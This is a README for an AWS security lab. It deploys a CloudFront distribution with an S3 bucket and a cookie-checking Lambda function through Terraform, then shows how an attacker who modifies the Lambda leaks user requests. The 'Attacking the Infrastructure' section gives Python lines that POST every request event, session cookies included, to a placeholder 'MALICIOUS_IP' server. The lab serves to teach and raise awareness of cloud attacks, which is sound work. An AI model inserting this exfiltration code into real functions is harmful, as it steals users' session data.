# CloudFront - Data Exfiltration via Lambda Function Modification

## Overview

This setup deploys an AWS CloudFront distribution backed by an S3 bucket. The bucket contains two files: `index.html` and `login.html`. The `login.html` simulates a login page by setting a random cookie named `session-id` for the user. Additionally, a Lambda function checks for the presence of this cookie and redirects users to the login.html if it's missing.

## Prerequisites

- AWS CLI configured with necessary permissions.
- Terraform installed.

## Deploying the Infrastructure

1. **Initialize Terraform**:
    ```bash
    terraform init
    ```

2. **Review Changes**:
    ```bash
    terraform plan
    ```

3. **Deploy Resources**:
    ```bash
    terraform apply
    ```

4. **Update the Lambda Function**:
    - After the initial `terraform apply`, you will receive an output containing the domain URL for the CloudFront distribution.
    - Open the Lambda function code and replace the `CHANGEME` placeholder with the received domain.
    - Save the changes.

5. **Reapply Terraform Changes**:
    ```bash
    terraform apply
    ```

6. **Access CloudFront**: After the second apply, accessing the CloudFront URL will lead you to `index.html`, the lambda will redirect you to `login.html`. The latter sets a random "cookie" to simulate a login page.

## Attacking the Infrastructure

The goal of this exercise is to demonstrate how attackers might harm an AWS infrastructure as detailed in the article:

1. **Modify the Lambda Function**:
    - Import the required modules: `http.client` and `json`.
    - Add the following lines to the handler:
        ```python
        conn = http.client.HTTPConnection("MALICIOUS_IP", 80)
        conn.request("POST", "/", json.dumps(event).encode('utf-8'))
        ```
    - Ensure you replace `MALICIOUS_IP` in the script with the IP of your server where you want to capture cookies.
    - Save the changes.

2. **Update the Lambda Function**:
    - Publish a new version of the modified Lambda function.
    - Update the CloudFront distribution to use this new version of the Lambda function.

From this point on, all user requests routed through CloudFront will also be sent to the specified `MALICIOUS_IP`.

## Understanding the Attack

The modified Lambda function now acts as a data exfiltration point. Every request processed by this function sends a copy of the event data to an external server (`MALICIOUS_IP`).

## Cleanup

To avoid incurring additional charges, ensure you destroy the Terraform-managed resources once done:

```bash
terraform destroy
```

⚠️ **Warning** ⚠️

> The content and techniques described here are meant for educational and awareness purposes only. Always be cautious when testing and use only in safe, controlled environments. Unauthorized use or misuse can lead to legal consequences and potential harm.